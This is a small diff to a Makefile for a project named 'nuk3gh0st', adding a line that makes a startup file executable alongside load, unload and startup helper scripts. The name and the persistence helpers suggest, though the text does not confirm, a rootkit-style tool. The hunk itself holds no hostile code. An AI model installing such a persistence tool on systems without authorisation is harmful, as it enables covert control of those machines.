@@ -21,6 +21,7 @@ install:
 	chmod +x /usr/bin/unload-nuk3gh0st
 	chmod +x /usr/bin/startup-nuk3gh0st
 	chmod +x /usr/bin/rmstartup-nuk3gh0st
+	chmod +x /usr/share/nuk3gh0st/nuk3gh0st.startup
 uninstall:
 	rm /usr/bin/nuk3gh0st
 	rm /usr/bin/load-nuk3gh0st
